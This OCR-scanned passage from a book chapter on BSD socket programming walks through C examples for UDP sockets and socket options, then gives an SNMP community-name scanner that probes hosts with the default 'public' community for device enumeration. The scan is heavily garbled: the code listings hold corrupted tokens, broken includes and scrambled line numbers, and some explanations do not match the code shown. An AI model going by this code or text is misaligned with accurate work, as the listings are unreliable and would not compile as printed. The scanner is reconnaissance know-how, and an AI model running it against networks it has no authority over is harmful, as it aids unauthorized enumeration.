14 
int 
15 
main (void) 
16 
( 
17 
int sock = 0; 
18 
19 
sock = socket (AF_INET, SOCK_DGRAM, 
0 ) ; 
20 
iflsock '- 0) 
21 ( 
22 
printf ( "socket () failed. \nM J ,-
23 
i 
24 
else 
25 
( 
26 
27 
printf(•socket() success.\n"}; 
28 
) 
29 
30 
return[0> ; 
31 ) 

BSD Sockets • Chapter 3 
109 
Compilation 
obsd32# cc -o udpl udpl.c 
Example Execution 
obsd32t ,/udpl 
socket{) success. 
udpl.c is a simple program that attempts to create a UDP socket. 
Analysis 
• 
At line 11 and 12, the sys/socket.h and netitiet/iii.h header files are included. 
These files contain the function prototypes and data structures required to use 
the SOCketO function. 
• 
At line 19, the socket() function is called. The first parameter is the integer con-
stant AF_INET (defined in sy$/s0cket,h).This constant indicates that the socket 
is of the AF_INET address family. The AF_INET address family indicates 
usage of IPv4 addressing. 
• 
The second parameter passed to the socket0 function is the integer constant 
SOCK^DGRAM (defined in sys/socket.h).Th'\s constant indicates the type of 
socket to be created. When used in conjunction with the AF_INETaddress 
family, SOCK_DGRAM indicates that a UDP socket should be created. 
• 
The third parameter passed to the socket () function may contain a protocol 
value, but this parameter is not used when creating a UDP socket and is set to 
zero in this example. 
• 
The sockctQ function returns a non-negative integer on success.This value 
uniquely identifies the socket within the creating process and is known as a 
socket descriptor. If an error occurs while creating the socket, a value of - / is 
returned. 
• 
At line 19, the socket descriptor value is tested for an error condition. If the 
return value is less than zero, an error message is printed to standard output. 
• 
At line 26, the successfully returned socket descriptor is passed to the close() 
function where it is closed and made no longer usable. 
Example 3.5 illustrates sending a UDP datagram using a socket descriptor that has 
^S • •[ been previously passed to the connect function. 
Example 3.5 Sending a UDP Datagram with the sendO Function {udp2.c) 
1 /* 
2 
* udp2.c 
3 * 
4 
* send UDP datagram using socket 

110 
Chapter 3 • BSD Sockets 
5 
* descriptor that has been passed 
6 
* to connect(), example program #2 
7 
* 
S 
* foster <jamescfoster@gmail. com> 
9 
v 
10 
1 1 
#include <stdio,h> 
12 
13 
tfinclude 
<sys/socketTh> 
14 
^include <netinet/in,h> 
1 5 
#include <arpa/inet. h> 
16 
17 
#deflne UDP2_DST_ADDR "127.0.0.1" 
18 
#define UDP2_DST_PORT 1234 
19 
20 
int 
21 
main(void) 
22 
{ 
23 
struct sockaddr_in sin; 
24 
char buf [100]; 
25 
int 
sock • 0; 
26 
int 
ret 
= 0; 
27 
28 
SOCk = 
s o c k e t (AF_INET, 
SOCK_DGRAM, 
0 1 ; 
29 
if(SOCk < 0) 
30 
( 
31 
printf("socket() failed.\n"); 
32 
return(l) ; 
33 
} 
34 
35 
memset(ksin, 0x0, sizeof{sin)); 
36 
37 
sin.sin_family 
= AF_INET; 
38 
sin.sin_port 
= htons(UDP2_DST_PORT); 
39 
sin.sin_addr.s_addr = inet_ad<3r[UDP2_DST_ADDRI; 
40 
41 
ret = connect(sock, (struct sockaddr *) &sin, sizeof(sin)} ; 
42 
ifiret •= 0) 
43 
{ 
4 4 
p r i n t f ( " c o n n e c t ( ) 
f a i l e d . \ n " ) ; 
45 
return(l); 
46 
} 
47 
48 
memsettbuf, 
'A1, 100); 
49 
50 
ret = sendfsock, buf, 100, 0); 
51 
if(ret != 100) 
52 
( 
printf ("sendO failed, \nM , 
54 
return(1); 
55 
} 
56 
57 
close (sock); 
58 
printf("send() success.\n"); 
59 
60 
return(O); 
61 
} 

BSD Sockets • Chapter 3 
111 
Compilation 
obsd32t gcc -o udp2 udp2.c 
Example Execution 
obsd32tt ,/udp2 
send() success, 
udp2.c builds upon the socket code illustrated in udpl.c, and illustrates how to 
declare and initialize the sockaddr_in structure as well as how to send a UDP datagram 
using the sendQ function. 
Analysis 
• 
At line 15, arpa/iiwt.h is added.This header file includes function prototypes 
for various conversion functions used for processing of IPv4 addresses in string 
"dot" notation and unsigned integer format. 
• 
At lines 17 and 18, the destination IP address and port to be used are declared 
using pre-compiler defines.These values will be used to define the endpoint 
that UDP datagrams should be sent to. 
• 
At lines 23 through 26, local variables to be used by the program are declared. 
The variable sin of type struct s<xkaddr_in will be used to define the destination 
IP address and the port that the datagrams should be sent to. 
• 
At lines 27 through 32, a UDP socket is created using the sockctQ function, as 
described in Example 3.4. 
• 
At line 37, the sinjamily member is set to match the AF_INET socket address 
family This value is always assigned to the shi_family member when imple-
menting UDP socket support. 
• 
At line 38, the sin_port member is set to the remote port that the UDP data-
grams should be delivered to. The port value is passed to the htonsQ function 
before being assigned to the sm_port member.The htonsQ function provides a 
portable means for ensuring that the port value is specified in network byte 
order. On computer systems that use little-endian byte ordering, the bytes that 
make up the port value are rearranged into network-byte order. On computer 
systems that use big-endian byte ordering, no change is required as big-endian 
and network-byte order are the same. 
• 
At line 39, the target IP address in string "dot" notation is converted to an 
unsigned integer format using the inet_addr() function and assigned to the 
sin_addr.s_addr member of the sockaddr_in structure. When sending data, this 
value indicates the IP address that the UDP datagram should be sent to.The 
inet_addr() function converts string in "dot" notation such as 127.0,0.1 to a 4-
byte unsigned integer format in network-byte order. If the address string 

112 
Chapter 3 • BSD Sockets 
passed to the function is invalid, the function will return the IPADDR_NONE 
constant to indicate an error condition. 
• 
At line 41, the conuectQ function is used to associate the parameters stored in 
the sin $ockaddr_in structure with the socket, and to set the state of the socket 
to connected. Upon successful return from the connect () function call, data may 
be sent to or received from the socket until an error occurs or the socket is 
closed with the close() function. The connect() will return a negative integer 
value to indicate an error condition. 
• 
At line 48, a lOO-byte buffer is initialized with the A character.This is the data 
that will be sent via the socket to the target IP address and port. 
• 
At line 50, the sendQ function is used to send data.The first parameter to the 
send function is a socket descriptor that has been successfully passed to the con-
nectQ function. The second parameter is a pointer to a character buffer con-
taining the data to be sent.The third parameter is the size in bytes of the 
character buffer.The fourth parameter may contain flag values, but is not used 
in this example.The sctul() function returns the number of bytes sent on suc-
cess or a negative integer value to indicate an error condition. 
• 
At line 57, the socket descriptor is closed using the close() function call. 
„ , ! „ „ 
Example 3.6 illustrates sending a UDP datagram using a socket descriptor with the 
I destination IP address and port specified at the rime of the function call. 
Example 3.6 Sending a UDP Datagram with the sendtoQ Function [udp3.c) 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
f* 
* udp3.c 
* 
* send UDP 
datagram 
using socket 
* d e s c r i p t o r and s e n d t c ( ) , example 
* program # 3 . 
• 
* 
f o s t e r 
<jainescfaster@ginail.com> 
V 
f t i n c l u d e < s t d i o . h > 
tf i n c l u d e < s y s / s o c k e t . h > 
^ i n c l u d e 
< n e t i n e t / i n + h > 
# i n c l u d e 
<;arpa/inet.b> 
^define UDP3_DST_ADDR ' 1 2 7 . 0 . 0 . 1 " 
ftdefine UDP3_DST_PORT 
1234 
int 
main(void) 
{ 
s t r u c t 
sockaddr_in 
s i n : 
char 
buf[100J; 
i n t 
sock = 0; 
i n t 
r e t 
= 0; 

BSD Sockets • Chapter 3 
27 
28 
sock = SOcket(AF_INET, 
SOCK_DGRAM, 
0 ) ; 
29 
if(sock < 0) 
30 
{ 
31 
printt ("socket {) failed, \n") ; 
32 
return(l); 
33 
} 
34 
35 
memset(&sin, 0x0, sizeof(sin)); 
36 
37 
sin.sin_family 
= AF_INET; 
38 
sin-sin_port 
= htons(UDP3_DST_PORT); 
39 
sin.sin_aadr.s_addr = inet_addr{UDP3_DST_ADDR); 
40 
41 
memsetlbuf, 
'A', 100); 
42 
43 
ret = sendto(sock, buf, 100, 0, 
44 
(struct sockaddr *) ssirt, sizeof (sin) I ; 
45 
if(ree ! = 100) 
46 
{ 
47 
printf Csendeo() 
failed. \n") ; 
48 
return(l) ; 
49 
} 
50 
51 
clc-se(sock) j 
52 
printf("sendto(J success.\n"); 
53 
54 
returnlO); 
55 } 
Compilation 
obsd32# gcc -o udpJ udp3.c 
Example Execution 
obsd32# ./udp3 
senate- () success . 
Analysis 
The udp3.C example program illustrates an alternative method for sending data using the 
sendtoQ function. Rather than specifying the destination IP address and port using the 
conncctQ function, they are specified each time the sendtoQ function is called by passing a 
sockaddr_in structure as the fifth parameter. This allows for a single socket descriptor to 
be used to send data to different destinations. The sendtoQ function is useful when data 
must be sent to various destinations such as when implementing a UDP-based scanner. 
The only differences between the tidp2.c example program and the udp3.c example 
are that the connect() function is not called and the sendtoQ function is called in place of 
the scndQ function. Example 3.7 illustrates how to receive a UDP datagram using the 
rccvfroniQ function. 

114 
Chapter 3 • BSD Sockets 
, Y N i „ i s Example 3.7 Receiving a UDP Datagram (udp4x) 
1 f* 
2 
* udp4.c 
3 
* 
4 
* receive 
tIDP 
datagram using 
5 
* recv£rom() function, example 
6 
* program #4. 
7 * 
8 
* foster < j&mescfaster@gTnail,*com> 
9 */ 
10 
11 
ttinclude 
<stdio.h> 
12 
13 ttinclude <;syE/socket.h> 
14 
^include <netinet/inTh> 
15 
16 # define UDP4_PORT 1234 
17 
18 int 
19 
maintvoid) 
20 { 
21 
struct sockaddr_in sin; 
22 
char buf [100]; 
23 
i n t 
sock = 0; 
24 
int ret a 0; 
25 
26 
sock = socket (AF_INET, SOCK_DGRAM, 0); 
27 
if(sock < 0) 
28 
( 
29 
printf("socketi) failed* Vnn); 
30 
return(1) ; 
31 
} 
32 
33 
memset(&sin, 0x0, sizeof(sin)); 
34 
35 
sin.sin_family 
= fiP_INET; 
36 
sin.sin_port 
= htons(UDP4_P0RT); 
37 
sin. sin_addr. s^addr = INADDR__ANY; 
38 
39 
ret = bind(sock, (struct sockaddr M &sin, sizeof(sin)}; 
40 
iffret < 0) 
41 
( 
42 
printf("bind() 
failed.\n->; 
43 
return(l); 
4 4 
) 
45 
46 
r e t = recvfromlsock, buf, 100, 0, 
MULL, NULL); 
47 
i f ( r e t < 0) 
48 
{ 
49 
printf CreevfromO 
failed.\n"); 
50 
return(1); 
51 
! 
52 
53 
close (sock}; 
54 
printf I"recvfrom{} 
success.\n"); 
55 
56 
return(O) ; 
57 } 

BSD Sockets • Chapter 3 
115 
Compilation 
obsd32t gcc -o udp4 udp4.c 
Example Execution 
obsd32t ./udp4 & 
[1] 18864 
obsd32# ./udp3 
recvfrom() success. 
sendto{) success. 
[1] 
+ Done 
. /udp4 
The udp4.c example program creates a UDP socket, binds the socket to port 1234, 
and waits to receive a single UDP datagram.The example execution illustrates execution 
of the ndp4 program followed by execution of the udp3 program. The ndp3 program 
sends a single UDP datagram to the udp4 program. 
Analysis 
At lines 13 and 14 of the udp4.c source code, the sys/sockct.h and tietinet/in.h 
header files are included. 
At line 16, the port that the UDP socket will be bound to is declared. In this 
example the port value is 1234. 
At line 26, a socket descriptor is created using the socket() function, as previ-
ously described. 
At lines 32 through 36, a sockaddr_in structure is initialized to contain the IP 
address and port values for the local endpoint that the socket will be bound to. 
The sin Jamil)' and sin_port values are treated as previously described. The 
siu_<iddr.s_addr member is assigned the INADDR_ANY integer constant value. 
This value indicates that the socket should be bound to any IP addresses avail-
able on the system. For example, if the program is run on a host with two net-
work interfaces that each have their own IP address, the socket should be 
bound and made available on both network interfaces. A socket can be bound 
to a single network interface by assigning the IP address of the particular inter-
face to the sin_addr.s_addr member. 
At line 39, the socket is bound to the endpoint defined in the $ockaddr_in 
structure by calling the bindQ function.The first parameter is the socket 
descriptor that is to be bound to the bindQ function.The second parameter is 
the address of a sockaddrjin structure, which must be cast to a sockaddr structure 
pointer. The third parameter is the size of the sockaddr_in structure in bytes. If 
the bindQ function is successful, a non-negative integer value is returned. If an 
error occurs, the bindQ function returns a negative integer value. 

116 
Chapter 3 • BSD Sockets 
• 
At line 46, the rt'cvfroitiQ function is used to receive a single U D P datagram. 
The first parameter to this function is the bound socket descriptor.The second 
pant meter is the character buffer into which received data should be stored. 
The third parameter is the length in bytes of the buffer. The fourth parameter 
might be a pointer to a sockaddrjn structure that has been cast to a socknddr 
structure pointer.The fifth parameter may be a pointer to an integer that con-
tains the length of the sockaddr_in structure in bytes. If the fourth and fifth 
parameters are supplied, the IP address and port of the sender of the received 
U D P datagram will be stored in the sociitiddi_)n structure. 
• 
At line 53, the socket descriptor is closed by calling the closcQ function, and the 
socket descriptor can no longer be used to receive data. 
Socket Options 
The BSD socket's API provides many functions useful for sending and receiving data. 
While the default behavior of these functions is suitable for implementing most 
common networking functionality, it may also be useful for adjusting certain behaviors 
to allow for or improve the design of an implementation. The ability to adjust this 
behavior is provided by the tctsockoptQ function. 
The setsockoptQ function allows for parameters to be adjusted at various levels of a 
protocol. In the case of the AF_INET address family, socket options may be adjusted for 
a socket descriptor or for specific aspects of the protocol in use, such as for the IPv4 
protocol, UDP,TCP, 1CMP, and so on. 
Socket options are most commonly used to adjust parameters at the socket level. 
Possible options include adjustment of error handling, buffering dara, address handling, 
port handling, and socket send and receive timeout values. Of these options, the socket 
level SO_RCl/T!MEO option is regularly used to set a timeout value for the rcadQ, 
reci'Q, and recvfroniQ functions. 
By default, the readQ, ivcvQ, and ivcvfivuiQ functions perform blocking reads, which 
means that when the functions are called, they will wait indefinitely until data is 
received or an error occurs. This behavior is undesirable if an implementation must per-
form some action if data does not arrive in a timely manner. Therefore, the SO_RCV-
TIMEO socket option may be used to set the maximum amount of time the read 
operation should wait for data before returning control to the calling function. Example 
sYN^Ei! 
3.8 illustrates use of the MtsockoptQ function to set the SO_RCVTlMEO socket option 
^ ^ B for a UDP socket. 
Example 3.8 Setting Socket Options with setsockoptO 
i 
/* 
2 
* makeudpsock() 
3 
* 
4 
-
5 
v 
6 
int makeudpsock (char *dst, unsigned shore port) 
7 ! 

BSD Sockets • Chapter 3 
117 
8 
struct sockaddr_in sin; 
9 
struct timeval tvH-
10 
unsigned int taddr = 0; 
11 
i n t sock = 0; 
12 
int ret = 0; 
13 
14 
taddr = inet_addr(targ); 
15 
ifUaddr == INADDFLNONEI 
16 
{ 
1 7 
printf("inet_addr(} 
failed.\n"); 
18 
return(-l); 
19 
} 
20 
21 
sock = socket(AF_INET, SOCK_DGRAM, 0); 
22 
if(sock c 0) 
23 
( 
printf("socketO failed.\n"); 
25 
return(-l(; 
26 
} 
27 
28 
memset (isin, 0x0, sizeof (sin) ) ; 
29 
30 
sin.5in_family 
= AF_INET; 
31 
sin.sin_port 
= htons(port); 
32 
sin.sin_addr. s_addr = taddr; 
33 
34 
ret = connect(sock, (struct sockaddr * J &sin, 
35 
sizeof (sin) ) ; 
36 
i f ( r e t < 0) 
37 
{ 
38 
printf("connect() 
failed.\n"); 
39 
return(-l) ; 
40 
} 
41 
42 
memsetl&tv, 0x00, sizeof(tv)); 
43 
44 
tv.tv_sec = 10; 
45 
46 
ret = setsockopt(sock, SOL_SOCKET, 
47 
S0_RCVTIME0, ttv, sizeof(tv)); 
48 
i f ( r e t < 0) 
49 
( 
50 
printf ("setsockopt () 
failed An11) ; 
51 
recurn(-l); 
52 
} 
53 
54 
return(sock); 
55 } 
In this example, a UDP socket is created and associated with a remote endpoint 
using the socket() and connect() functions.The setsockoptQ function is then used to set a 
receive timeout value for the socket. This timeout value is stored in a timevai structure. 
The newly created socket is then returned from the function. 

118 
Chapter 3 • BSD Sockets 
Analysis 
At lines 7 through 39, a UDP socket is created using the socket() and connect () 
functions, as previously described. 
At lines 45 and 46, the sctsockoptQ function is called. 
The first parameter passed to the function is the socket descriptor that the 
socket options should be set to. 
The second parameter is the protocol level that the option should be set to. In 
this example, the SOL_SOCKET integer constant is passed to indicate that the 
option should be set at the socket protocol level. 
The third parameter passed is the socket option flag itself. In this example, the 
SO_RCVTlMEO integer constant is specified. 
The fourth and fifth parameters passed to the function vary depending on the 
value of the socket option level and socket option values passed as the second 
and third parameters. In the case of the SOL^SOCKET and SOJR.CVTIMBO 
options, a pointer to a tiiiuvai structure is passed as the fourth argument and 
the size of the time veil structure in bytes is passed as the fifth argument. The 
value of the timeval structure t\>_sec and tv_u$ec members indicates the read 
timeout value to be used for the socket descriptor supplied as the first param-
eter. 
NOTE 
To set options at the IP level, the IPPROTOJP level flag is used in place of the 
SOLJOCKET flag. For UDP, the IPPROTOJJDP flag is used. For TCP, the 
IPROTO_TCP flag is used. Additional socket-level flags and socket options are 
defined in sys/socket.h and netinetlin.h. 
Network Scanning with UDP Sockets 
This section examines a complete program that uses the UDP protocol and the BSD 
sockets API to implement a Simple Network Management Protocol (SNMP) commu-
nity name-scanning utility.The SNMP protocol is a widely supported protocol that is 
used for retrieving and configuring various types of management data for network-con-
nected computers and devices. The retrieval and configuration of management data is 
achieved by sending SNMP Get Request or Set Request values encapsulated in UDP data-
grams to the remote host. 
In the case of the SNMP GetRcqttest value, the source host sends a GctRcqucst value 
to a remote host.The remote host will then accept and validate the request and send a 
Get Response value encapsulated in a UDP datagram containing the request information, 

BSD Sockets • Chapter 3 
119 
back to the requester. In the case of the SNMP SetRequest value, the source host sends a 
SetRequest value to a remote host. The remote host then accepts and validates the request 
and makes die requested configuration change. 
The information to be retrieved or changed is specified within the body of the 
SNMP GetRequest or in the SetRequest value. Possible information to get or set using 
SNMP includes the hostname of the remote host, IP address configuration, and statistics 
information.The software that handles SNMP requests is known as an SI\rMP agent. 
SNMP agent software binds to UDP port 161 and listens for incoming GetRequest and 
SetRequest va 1 u es. T h e SNMP a gen t requires that received request values contain a commu-
nity name value that matches a community name known to the SNMP agent.This value 
acts as somewhat of a password in that SNMP request values will be ignored by an 
SNMP agent if the community name value supplied in the request is not validated. 
Fortunately, most SNMP agent software comes with the community name "public" 
enabled by default.This makes the public community name useful for discovery and 
enumeration of a large number of SNMP-enabled devices. Example 3.9 illustrates how 
to incorporate UDP socket programming into a complete program for sending and 
receiving an SNMP GetRequest value to retrieve the hostname of a remote host using 
the SNMP protocol. 
1 Example 3.9 SNMP Scanner (snmpl.c) 
S 1 
2 
* snmpl.c 
3 
* 
4 
* snmp scanner example program #1. 
5 * 
6 
* 
f o s t e r <jamescfoster@gmail.cQrri> 
7 
v 
8 
9 
# i n c l u d e 
< s t d i o . h > 
1 0 
# i n c l u d e 
<stcUib.h> 
11 
# i n c l u d e 
<unistd.h> 
1 2 
# i n c l u d e 
<:string.h> 
13 
^ i n c l u d e 
<ctype,h> 
14 
1 5 #include <SYS/30cket.h> 
16 #include <netinet/in.h> 
17 #include <arpa/inet.h> 
18 
1 9 
ttdefine 
SNMP1_DEF_P0RT 
161 
20 
tdefine 
SNMP1_DEF_C0MN 
"public" 
21 
22 
#define 
SNMP1_BE1F_SIZE 
0x0400 
2 3 
2 4 
i* 
25 
* hexdisp{) 
2 6 
* 
2 7 
• 
28 
-/ 
29 
void hexdisp 
{char 
*buf, 
i n t 
lenj 
30 ( 
31 
char tmp[16) ; 

120 
Chapter 3 • BSD Sockets 
32 
33 
34 
35 
36 
37 
38 
39 
40 
41 
42 
43 
44 
45 
46 
47 
48 
49 
50 
51 
52 
53 
54 
55 
56 
57 
58 
59 
60 
61 
62 
63 
64 
65 
66 
67 
68 
69 
70 
71 
72 
73 
74 
75 
76 
77 
78 
79 
80 
81 
82 
83 
84 
85 
86 
87 
88 
int x = 0; 
int y = 0; 
printf("\n"); 
for(x=0; x < len; ++x) 
{ 
tmp[x % 16] = buf [X] ; 
if ( (x + 1) % 16 == 0) 
{ 
for(y=Q; y < 16; ++y) 
{ 
printf("%02X 
] 
tmply] & OxFF); 
if((x % 
{ 
for(y=0; y < 16; ++y) 
{ 
printf("%c", isprint(tmplyl) ? 
tmp[y] 
' . ' ) ; 
} 
printf C\n" ) ; 
6) != 0) 
or(y=0; y < (x % 16); ++y) 
printf("%02X ", tmp[y] & OxFF); 
or(y=(x % 16); y < 16 
; ++yl 
printf(• " ) ; 
or(y=0; y <: (x % 16); ++y) 
printf C*c", isprint(tmp[y)) 7 tmp[y] ' . ' ) : 
printf["\n"); 
makegetreqf) 
ftdefine SNMP1_PDU_HEAD "\x30\x00\x02\x01\x00\x04' 
ttdeftne SNMP1_PDU_TAIL "\xa0\xlc\x02\x04\x7e\xl6\xa2\x5e" \ 
-\x02\x01\xOO\x02\x01\xOO\x30\xOe" \ 
-\x30\x0e\x06\x08\x2b\x06\x01\x02n\ 
-\x01\x01\x05\xOO\x05\xOO" 

89 
90 
91 
92 
93 
94 
95 
96 
97 
98 
99 
100 
101 
102 
103 
104 
105 
106 
107 
108 
109 
110 
111 
112 
113 
114 
115 
116 
117 
118 
119 
120 
121 
122 
123 
124 
125 
126 
127 
128 
129 
130 
131 
132 
133 
134 
135 
136 
137 
138 
139 
140 
141 
142 
143 
144 
i n t 
{ 
; 
• 
* 
• 
* 
-.-
Lnt 
{ 
makegetreq (char *bufH int bleu, int *olen, char *comn) 
int hlen = sizeof(SNMPl_PDU_HEAD) - 1; 
int tlen = sizeof(SNMPI_FDU_TAIL) - 1; 
int clen = strlen(comn); 
int len = 0; 
len = hlen + 1 + clen +• tlen; 
if (len > blen) 
{ 
printf("insufficient buffer space 
(%d,%d).\nn, 
blerij len) ; 
return(-1); 
> 
memset(buf, 0x00, blen); 
memcpy(buf 
„ SNMPl_PDU_HEAD, hlen); 
memcpy(buf + hlen + 1 
„ comn 
, clen); 
memcpy(buf + hlen + 1 + clen, SNHFl_PDU_TAILH tlen); 
buf[0x01] - 0x23 + clen; 
buf[hlen] = (char) clen; 
*olen = len; 
return(O); 
dores() 
dores (int sock) 
char buf[SNMP1_BUF_SIZE]; 
; 
' • 
* 
, 
* 
v-
int ret = 0; 
r e t = recvfrom(sock, buf, 
$NMPI_EUF_SIZE, 0, NULL, NULL 
if(ret < 0) 
{ 
printf ("recvO 
failed. \n") ; 
return(-l); 
} 
hexdisptbuf, 
r e t ) ; 
return(O); 
doreq() 
145 int doreq (int sock, char *comn) 

122 
Chapter 3 • BSD Sockets 
146 { 
147 
char buf[SNMP1_BUF_SIZE]; 
148 
int leu = 0; 
149 
int ret = 0; 
150 
151 
ret = makegetreqtbuf, SNMP1_BUF_SIZEH &lenr comn); 
152 if (ret < 0) 
153 c 
1 54 
printf("makegetreq() failed. \n") *t 
155 
return(-l>; 
156 ) 
157 
158 
hexdispfbuf, 
len); 
159 
160 
ret • send (sock, buf, len, 0) ; 
161 
if (ret != len) 
162 
( 
163 
printf("send!) 
failed.\n"); 
164 
return(-l); 
165 
} 
166 
167 
returnlO) ; 
168 } 
169 
1 7 0 / * 
171 
* makeudpsock() 
172 * 
173 * 
174 
v 
175 int makeudpsock (char *targ, unsigned short port) 
176 i 
177 
struct sockaddr_in sin; 
178 
unsigned int taddr = 0; 
179 
int sock = 0; 
180 
int ret = 0; 
181 
182 
taddr = inet_addr (targ) ; 
183 
i£(taddr == INADDR_NONE] 
184 
{ 
185 
printf("inet_addr() 
failed.\n"); 
186 
r e t u r n ( - l ) ; 
187 ) 
188 
189 
sock = socket (AF_INET, SOCK_DGRAM, 0); 
190 
if(sock < 0) 
191 
{ 
192 
printf("socket() failed,\nM J; 
193 
return(-l>; 
194 
} 
195 
196 
memset(&sin, QxG, sizeof(sin)); 
197 
198 
sin.sin_family 
= AF_INET; 
199 
sin.sin_port 
= htons(port); 
200 
sin tsin_addr.s_addr = taddr; 
201 
202 
ret • connect(sock, 
{struct sockaddr *) &sinr sizeof(sin)); 

BSD Sockets • Chapter 3 
123 
203 
204 
205 
206 
207 
208 
209 
210 
211 
212 
213 
214 
215 
216 
217 
218 
219 
220 
221 
222 
223 
224 
225 
226 
227 
228 
229 
230 
231 
232 
233 
234 
235 
236 
237 
238 
239 
240 
241 
242 
243 
244 
; 
i* 
* 
* 
* 
« . - • 
i n t 
1 
•: n t 
ret 
if(ret < 0) 
{ 
p r i n t f ( " c o n n e c t ( 1 
f a i l e d . \ n " ) ; 
return(-l); 
} 
return(sock)7 
scan() 
scan (char *targp unsigned short port, char *cname} 
int sock = 0; 
ret 
= 0; 
sock = makeudpsock(targ, port); 
iftsock < 0) 
{ 
printf ("makeudpsocket (J failed An11) ; 
return(-l); 
} 
= doreq(sock, cname); 
iflret < 0) 
{ 
printf ("doreqO failed, \n") ; 
re turn(-1) ; 
> 
ret = dores(sock); 
iffret <• 0) 
{ 
printf("dores () failed.\nH) ; 
return(-l); 
} 
return(O); 
} 
245 
246 
,••> 
247 
* usageO 
248 * 
249 * 
250 v 
251 void usage{char *prog) 
252 { 
253 
printf ("snmpl 00.00.01\r\n"); 
254 
printf ("usage 
: %s -t target_ip <-p target_port> • \ 
255 
" -c-c community_naicie>\n", prog) ; 
256 
printfI"example: %s -t 127.0.0.1 -p 161 -c public\n\n", 
257 
prog) ; 
258 } 
259 

124 
Chapter 3 • BSD Sockets 
260 
int 
261 
m a i n ( i n t argc, 
char *argv[]) 
262 
[ 
263 
unsigned short port = SNMP1_DEF_P0RT; 
264 
char *targ = NULL; 
265 
char *comn = SNMP1_DEF_C0MN; 
266 
char ch = 0; 
267 
int 
ret = 0; 
268 
269 
opterr = 0; 
270 
while ((ch = getopt{argc, argv, "t:p:c:")) J= -1) 
271 
( 
272 
switch(ch) 
273 
{ 
274 
case ' t' : 
275 
276 
targ = optarg; 
277 
break; 
278 
279 
c a s e 
' p ' : 
280 
281 
port = a t o i ( o p t a r g ) ; 
282 
break; 
283 
284 
case 'c' ; 
285 
286 
comn = optarg; 
287 
break; 
288 
289 
case •?' : 
290 
default: 
291 
292 
usage(argv[0]); 
293 
return (1); 
294 
} 
295 
} 
296 
297 
ifitarg == NULL] 
298 
{ 
299 
usage(argv[01); 
300 
return(l) ; 
301 
} 
302 
303 
printf("using: target: %s; port: %d; " 
V 
304 
community name: \"%s\" \n", targ, port, comn) ] 
305 
306 
ret = scan(targ, port, comn) ; 
307 
if(ret < 0) 
308 
{ 
309 
printf("scant) 
failed.\n"); 
310 
return(l); 
311 
} 
312 
313 
printf("scan complete,\n"}; 
314 
315 
return(O); 
316 
} 

BSD Sockets • Chapter 3 
125 
Compilation 
obsd32t gcc -o snmpl snmpl.c 
Example Execution 
obsd32* ./snmpl -t 192.168,1.100 
using: target: 192.168.1.100; port: 161; community name: -public" 
30 29 02 01 00 04 06 70 75 62 6C 59 63 A0 1C 02 0) 
public .. 
04 7E 16 A2 5E 02 01 00 02 01 00 30 OE 30 0C 06 .-.£' 
0.0.. 
08 2B 06 01 02 01 01 OS 00 05 00 
.+ 
30 2F 02 01 00 04 06 70 75 62 6C 69 63 A2 22 02 0/ 
public*". 
04 7E 16 A2 5E 02 01 00 02 01 00 30 14 30 12 06 .-.£" 
0.0.. 
05 2B 06 01 02 01 01 05 00 04 06 68 70 31 37 30 . + 
hpl70 
30 
0 
scan complete. 
obsd32# ./snmpl -t 192.168.1.100 -c internal 
using: target: 192.168.1-100; port: 161; community name: •internal" 
30 2B 02 01 00 04 OE 69 6E 74 65 72 6E 61 6C AO 0+ 
internal 
1C 02 04 7E 16 A2 5E 02 01 00 02 01 00 30 0E 30 ...~.f 
0.0 
0C 06 08 2E 06 01 02 01 01 05 00 05 00 
...+ 
30 31 02 01 00 04 08 69 6E 74 65 72 6E 61 6C A2 01 
internal* 
22 02 04 7E 16 A2 5E 02 01 00 02 01 00 30 14 30 "..-.C 
0.0 
12 06 08 2B 06 01 02 01 01 05 00 04 06 68 70 31 ... + 
hpl 
37 30 30 
700 
scan complete. 
The smnphc program accepts target IP addresses, target ports, and community name 
values from the command line. These values are used to create an SNMPvl GetRequest 
Protocol Data Unit (PDU) value that is then encapsulated in a UDP datagram and sent 
to the specified target IP address.The program then waits to receive an SNMP 
GctRespousc value. If a response is received, it is formatted and printed to standard 
output. 
Analysis 
At lines 8 through 16, the required header files for this program are included. 
At lines 18 and 19, the default UDP port and SNMP community name are 
specified.The standard port for the SNMP agent service is UDP port 161.The 
string public is used by default. 
At lines 23 through 75, the hexdispQ function is defined and implemented.This 
function accepts two parameters. The first parameter is a pointer to a character 

126 
Chapter 3 • BSD Sockets 
buffer. The second parameter is a signed integer value that indicates the length 
of the character buffer in bytes. This function formats the supplied character 
buffer into a human readable format and prints the formatted data to standard 
output.This format is similar to the format produced by the tcpdump program 
when used in conjunction with the —X flag. 
• 
At lines 83 through 87, the bytes of the SNMP GetRequest value are defined. 
The SNMP1_PDU_HEAD value will later be copied into a character buffer 
followed by the SNMP community name and then by the 
SNMP1_PDU_TAIL value. When combined, these three values make up the 
SNMP Get Request value that can be sent to a remote host. 
• 
At lines 89 through 115, the makegetreqQ function is defined and implemented. 
This function is responsible for building an SNMP GetRequest value and 
storing this value in the supplied buffer. The first parameter to this function is a 
pointer to a character buffer.The second parameter is a signed integer that 
indicates the length of the character buffer in bytes. The third parameter is a 
pointer to a signed integer value in which the length of the created SNMP 
GetRequest value will he stored.The fourth parameter is the SNMP commu-
nity name to be used. The SNMP GetRequest value built includes a request for 
the SNMP MIB-H system.sysNatue.O value, which is the hostname of the target 
system. 
• 
At line 105, the makegetreqQ function copies the SNMP1 _PDU_HEAD value 
into the supplied character buffer. 
• 
At line 106, the makegetreqQ function copies the SNMP community name sup-
plied by the caller into the character buffer after the SNMPl_PDU_HEAD 
value. 
• 
At line 107, the makegetreqQ function copies the SNMP1 _PDU_TAIL into the 
character buffer after the SNMPl_PDU_HEAD and SNMP community name 
values. 
• 
At line 109, the makegetreqQ function stores the length of the supplied SNMP 
community name plus the constant value 35 in the second byte of the char-
acter buffer.This is required to properly format the SNMP GetRequest value. 
• 
At line 110, the makegetreqQ function stores the length of the SNMP commu-
nity name in the byte that follows the SNMP1_PDU_HEAD value, but pre-
cedes the SNMP community name value. 
• 
At line 112, the makegetreqQ function stores the length of the newly created 
SNMP GetRequest value in the olen variable. 
• 
At line 114, the makegetreqQ function returns a success. At this point, a valid 
SNMP GetReqtist value has been built and stored in the supplied character 
buffer. 
• 
At line 122 through 127, the doresQ function is defined and implemented. This 
function is used to receive a SNMP GetRcsponsc value that originated from a 

BSD Sockets • Chapter 3 
127 
remote host that a SNMP GetRequest value was previously sent to.This func-
